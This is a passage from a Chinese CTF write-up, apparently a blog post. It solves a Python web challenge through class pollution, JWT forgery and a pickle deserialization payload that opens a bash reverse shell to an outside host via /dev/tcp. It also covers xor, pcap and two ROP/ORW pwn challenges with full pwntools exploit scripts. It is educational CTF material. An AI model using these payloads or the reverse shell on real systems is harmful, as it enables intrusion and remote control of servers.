class="number">400</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;User not found&quot;</span>&#125;, status=<span class="number">404</span>)</span><br><span class="line">    <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid request&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>题目给了源码,</p>
+<ul>
+<li>存在merge,并且User类有<code>__init__</code>,一眼原型链污染,可以污染到global全局变量</li>
+<li>存在RestrictedUnpickler并重写了find_class,可以绕过来pickle反序列化</li>
+</ul>
+<p>​	所以这道题思路就是先利用原型链污染来污染secret_key伪造admin,再污染safe_modules和safe_names来绕过RestrictedUnpickler限制即可.</p>
+<p>源码中<code>/register</code>路由可以进行原型链污染</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019162312868.png" alt="image-20241019162312868" data-caption="image-20241019162312868" loading="lazy"></p>
+<p>在<code>/upload</code>路由可以上传pkl文件来触发pickle反序列化.</p>
+<p>所以直接先传</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot;: &#123;</span><br><span class="line">        &quot;__globals__&quot;: &#123;</span><br><span class="line">            &quot;secret_key&quot;: &quot;123456&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>污染secret_key</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019162519604.png" alt="image-20241019162519604" data-caption="image-20241019162519604" loading="lazy"></p>
+<p>之后jwt伪造</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019162618743.png" alt="image-20241019162618743" data-caption="image-20241019162618743" loading="lazy"></p>
+<p>再污染</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;safe_names&quot;</span> <span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;getattr&quot;</span><span class="punctuation">,</span><span class="string">&quot;system&quot;</span><span class="punctuation">,</span><span class="string">&quot;dict&quot;</span><span class="punctuation">,</span><span class="string">&quot;globals&quot;</span><span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line">和</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;safe_modules&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;builtins&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>之后根据<a target="_blank" rel="noopener" href="https://goodapple.top/archives/1069">博客</a>里面绕过builtins的例子写payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data=<span class="string">&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS&#x27;builtins&#x27;</span></span><br><span class="line"><span class="string">tRp1</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(g1</span></span><br><span class="line"><span class="string">S&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1&#x27;&quot;)&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span>.encode()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dddd.pkl&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Type of &#x27;data&#x27;: <span class="subst">&#123;<span class="built_in">type</span>(data)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Module of &#x27;data&#x27;: <span class="subst">&#123;data.__module__ <span class="keyword">if</span> <span class="built_in">hasattr</span>(data, <span class="string">&#x27;__module__&#x27;</span>) <span class="keyword">else</span> <span class="string">&#x27;N/A&#x27;</span>&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>上传即可</p>
+<p>PS:这shell弹的太慢了,我还以为环境死了差点关了….</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019162930878.png" alt="image-20241019162930878" data-caption="image-20241019162930878" loading="lazy"></p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><p>题目描述</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimic is a keyword.</span><br><span class="line">0b050c0e180e585f5c52555c5544545c0a0f44535f0f5e445658595844050f5d0f0f55590c555e5a0914</span><br></pre></td></tr></table></figure>
+
+<p>直接给gpt,秒了</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019163249407.png" alt="image-20241019163249407" data-caption="image-20241019163249407" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019163313547.png" alt="image-20241019163313547" data-caption="image-20241019163313547" loading="lazy"></p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="ezflag"><a href="#ezflag" class="headerlink" title="ezflag"></a>ezflag</h2><p>解压压缩包有个流量包,拿工具跑出来一个压缩包</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019163729644.png" alt="image-20241019163729644" data-caption="image-20241019163729644" loading="lazy"></p>
+<p>解压后有个flag.zip,但是解压不出来,拿file看一下发现是一个png<img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019163729644.png"><img src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019163823523.png" alt="image-20241019163823523" data-caption="image-20241019163823523" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019163915023.png" alt="image-20241019163915023" data-caption="image-20241019163915023" loading="lazy"></p>
+<p>之后改一下后缀即可得到flag</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019163906271.png" alt="image-20241019163906271" data-caption="image-20241019163906271" loading="lazy"></p>
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="signin-revenge"><a href="#signin-revenge" class="headerlink" title="signin revenge"></a>signin revenge</h2><h3 id="换题目libc环境"><a href="#换题目libc环境" class="headerlink" title="换题目libc环境"></a>换题目libc环境</h3><blockquote>
+<p>那道题目的时候，发现题目是直接跑不起来的。开始以为是沙箱的问题，还是太菜了。其实更换题目libc环境的问题</p>
+<p>这里跟换一下题目的libc环境，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed  libc.so.6 ./libc.so.6 vuln</span><br><span class="line">patchelf --set-interpreter  ./ld-linux-x86-64.so.2  vuln</span><br></pre></td></tr></table></figure>
+
+<p>ldd vuln查看一下更换是否成功。</p>
+<p>然后就可以正常运行了。</p>
+<p>踩坑点：注意要把给定的libc文件进行授权。并且要在管理员模式下授权。</p>
+<p>这里注意不换也行，正常打远程应该不影响做题，但是复现跑本地就会遇到麻烦了。但是如果是你是kali的话。把他俩放在同一文件下kali会自行匹配ld文件和libc文件</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bbq@ubuntu:~/桌面/啊布拉布拉/<span class="number">11111</span>$ ldd vuln</span><br><span class="line">	linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007fff6fb85000</span>)</span><br><span class="line">	./libc.so<span class="number">.6</span> (<span class="number">0x00007fce115dc000</span>)    <span class="comment">//---------------------------------------------&gt;&gt;&gt;ld文件</span></span><br><span class="line">	./ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> =&gt; /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007fce117d0000</span>)<span class="comment">//-------&gt;&gt;&gt;libc文件</span></span><br><span class="line">bbq@ubuntu:~/桌面/啊布拉布拉/<span class="number">11111</span>$ </span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>先日常检查一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bbq@ubuntu:~/桌面/啊布拉布拉/11111/2222$ checksec vuln</span><br><span class="line">[*] <span class="string">&#x27;/home/bbq/桌面/啊布拉布拉/11111/2222/vuln&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3fe000)</span><br><span class="line">bbq@ubuntu:~/桌面/啊布拉布拉/11111/2222$ </span><br></pre></td></tr></table></figure>
+
+<p>正常的NX和got表可写</p>
+<p>丢进ida里面看看</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">init</span>(argc, argv, envp);</span><br><span class="line">  <span class="built_in">sandbox</span>();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;lets move and pwn!&quot;</span>);</span><br><span class="line">  <span class="built_in">vuln</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x130</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进去可以明显的看见一个沙箱函数和我们所要纯在漏洞的read函数</p>
+<p>简单看一下沙箱函数</p>
+<p>这里我问了一下gpt，其实大概我的理解就是提醒我们使用ORW</p>
+<h3 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h3><p>首先通过<code>open函数</code>向<code>bss段上</code>中写入<code>b&#39;./flag\x00\x00&#39;</code>，并将<code>b&#39;./flag\x00\x00&#39;</code>作为<code>open函数</code>的参数，构造<code>open(b&#39;./flag\x00\x00&#39;)</code>用来打开当前目录名为flag的文件，其中0表示只读方式打开。然后构造 <code>read(3, name_addr, 0x50)</code> 将 flag 内容写入到 <code>name</code> 的地址处，再通过构造 <code>write(1, name_addr, 0x50)</code> 将 flag 内容从 <code>name</code> 的地址处输出到终端。</p>
+<p>寄存器的偏移查找</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./libc.so.6 --only  <span class="string">&#x27;pop|ret&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>ROP链就是一个正常的泄露libc基址链</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">from pwn <span class="keyword">import</span>*</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span></span></span><br><span class="line"><span class="function">libc</span>=<span class="built_in">ELF</span>(<span class="string">&#x27;./libc.so.6&#x27;</span>)   </span><br><span class="line">elf=<span class="built_in">ELF</span>(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="meta">#p=remote(<span class="string">&quot;pwn-d929761f60.challenge.xctf.org.cn&quot;</span>, 9999, ssl=True)</span></span><br><span class="line">p = <span class="built_in">process</span>(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi=<span class="number">0x0000000000401393</span></span><br><span class="line">p.<span class="built_in">recvuntil</span>(<span class="string">&quot;lets move and pwn!&quot;</span>)</span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>)+<span class="built_in">p64</span>(rdi)+<span class="built_in">p64</span>(elf.got[<span class="string">&#x27;puts&#x27;</span>])+<span class="built_in">p64</span>(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+<span class="built_in">p64</span>(<span class="number">0x4012F0</span>)</span><br><span class="line"><span class="meta">#bug()</span></span><br><span class="line">p.<span class="built_in">send</span>(payload)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="built_in">u64</span>(p.<span class="built_in">recvuntil</span>(<span class="string">&quot;\x7f&quot;</span>)[<span class="number">-6</span>:].<span class="built_in">ljust</span>(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">rdi = libc_base+<span class="number">0x0000000000023b6a</span></span><br><span class="line">rsi = libc_base+<span class="number">0x000000000002601f</span></span><br><span class="line">rdx = libc_base+<span class="number">0x0000000000142c92</span></span><br><span class="line">rdx_r12=libc_base+<span class="number">0x0000000000119211</span></span><br><span class="line">rax = libc_base+<span class="number">0x0000000000036174</span></span><br><span class="line">ret = libc_base+<span class="number">0x0000000000022679</span></span><br><span class="line">syscall=libc_base+<span class="number">0x000000000002284d</span></span><br><span class="line">open_=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read=libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write=libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mprotect=libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">bss=<span class="number">0x404060</span>+<span class="number">0x500</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">p.<span class="built_in">recvuntil</span>(<span class="string">&quot;lets move and pwn!&quot;</span>)</span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*(<span class="number">0x100</span>)+<span class="built_in">p64</span>(bss)+<span class="built_in">p64</span>(rsi)+<span class="built_in">p64</span>(bss)+<span class="built_in">p64</span>(read)+<span class="built_in">p64</span>(<span class="number">0x4012EE</span>)</span><br><span class="line"><span class="meta">#bug()</span></span><br><span class="line">p.<span class="built_in">send</span>(payload)</span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line">orw  = b<span class="number">&#x27;</span>/flag\x00\x00\x00<span class="number">&#x27;</span></span><br><span class="line">orw += <span class="built_in">p64</span>(rdi) + <span class="built_in">p64</span>(bss)  #/flag的字符串位置，要改</span><br><span class="line">orw += <span class="built_in">p64</span>(rsi) + <span class="built_in">p64</span>(<span class="number">0</span>)</span><br><span class="line">orw += <span class="built_in">p64</span>(open_)</span><br><span class="line"></span><br><span class="line">orw += <span class="built_in">p64</span>(rdi) + <span class="built_in">p64</span>(<span class="number">3</span>)</span><br><span class="line">orw += <span class="built_in">p64</span>(rdx_r12) + <span class="built_in">p64</span>(<span class="number">0x50</span>)*<span class="number">2</span></span><br><span class="line">orw += <span class="built_in">p64</span>(rsi)+<span class="built_in">p64</span>(bss+<span class="number">0x200</span>) #读入flag的位置</span><br><span class="line">orw += <span class="built_in">p64</span>(read)</span><br><span class="line">orw += <span class="built_in">p64</span>(rdi) + <span class="built_in">p64</span>(<span class="number">1</span>)</span><br><span class="line">orw += <span class="built_in">p64</span>(rdx_r12) + <span class="built_in">p64</span>(<span class="number">0x50</span>)*<span class="number">2</span></span><br><span class="line">orw += <span class="built_in">p64</span>(rsi)+<span class="built_in">p64</span>(bss+<span class="number">0x200</span>) #读入flag的位置</span><br><span class="line">orw += <span class="built_in">p64</span>(write)</span><br><span class="line"></span><br><span class="line"><span class="meta">#pr(hex(len(orw)))</span></span><br><span class="line">p.<span class="built_in">send</span>(orw)</span><br><span class="line"></span><br><span class="line">p.<span class="built_in">interactive</span>()</span><br></pre></td></tr></table></figure>
+
+<h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>日常检查</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bbq@ubuntu:~/桌面/啊布拉布拉/11111$ checksec vuln</span><br><span class="line">[*] <span class="string">&#x27;/home/bbq/桌面/啊布拉布拉/11111/vuln&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3f7000)</span><br><span class="line">bbq@ubuntu:~/桌面/啊布拉布拉/11111$ </span><br></pre></td></tr></table></figure>
+
+<p>两道题几乎一样，但是这道题多了几个绕过和伪随机数绕过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)   </span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;pwn-ecdfbe9bc0.challenge.xctf.org.cn&quot;, 9999, ssl=True)</span></span><br><span class="line">p=process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xun</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Input the authentication code:&#x27;</span>)</span><br><span class="line">       <span class="comment">#payload = str((elf1.rand()%100) + 1)</span></span><br><span class="line">       <span class="comment">#p.send(payload)</span></span><br><span class="line">        p.send(p64(elf1.rand()%<span class="number">100</span>+<span class="number">1</span>))</span><br><span class="line">       </span><br><span class="line">       <span class="comment"># sleep(0.1)</span></span><br><span class="line">     </span><br><span class="line">       </span><br><span class="line">rdi=<span class="number">0x0000000000401893</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">elf1=ctypes.CDLL(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#elf1=ctypes.LoadLibrary(&quot;./libc.so.6&quot;)</span></span><br><span class="line">elf1.srand(elf1.time(<span class="number">0</span>))    <span class="comment">#与题目相同以时间为种子</span></span><br><span class="line"></span><br><span class="line">xun()</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,p32(<span class="number">1</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Index: &quot;</span>,p32(<span class="number">1</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Note: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>)+p64(rdi)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(<span class="number">0x00000000040177B</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">libc_base=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment">#print(hex(libc_base))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + <span class="built_in">hex</span>(libc_base) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rdi = libc_base+<span class="number">0x0000000000023b6a</span></span><br><span class="line">rsi = libc_base+<span class="number">0x000000000002601f</span></span><br><span class="line">rdx = libc_base+<span class="number">0x0000000000142c92</span></span><br><span class="line">rdx_r12=libc_base+<span class="number">0x0000000000119211</span></span><br><span class="line">rax = libc_base+<span class="number">0x0000000000036174</span></span><br><span class="line">ret = libc_base+<span class="number">0x0000000000022679</span></span><br><span class="line">syscall=libc_base+<span class="number">0x000000000002284d</span></span><br><span class="line">open_=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read=libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write=libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mprotect=libc_base + libc.sym[<span 